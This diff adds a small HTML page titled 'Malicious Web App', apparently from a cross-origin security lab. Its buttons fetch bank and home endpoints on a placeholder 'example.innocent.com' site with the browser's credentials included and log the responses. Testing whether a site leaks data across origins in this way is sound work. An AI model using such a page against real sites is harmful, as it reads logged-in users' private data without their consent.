@@ -1,0 +1,36 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <title>Malicious</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+
+<body>
+  <p>Malicious Web App</p>
+  <button type="button" onclick="fetchData('bank')">Fetch Bank Obj</button>
+  <button type="button" onclick="fetchData('test')">Fetch Test String </button>
+  <button type="button" onclick="fetchData('bankpage')">Fetch Bank HTML Page </button>
+  <button type="button" onclick="fetchData('home')">Fetch Home Page (Not controlled by a controller) </button>
+  <button type="button" onclick="fetchData()">Fetch Index Page (Not controlled; permit even without login) </button>
+
+  <script>
+  function fetchData(endpoint = ""){
+    fetch("http://www.example.innocent.com:8090/" + endpoint, {
+    credentials:'include'
+    })
+      .then(function (response) {
+        return response.text();
+      })
+      .then(function (html) {
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(html, "text/html");
+
+        console.log(doc);
+      });
+  }
+  </script>
+ 
+</body>
+
+</html>
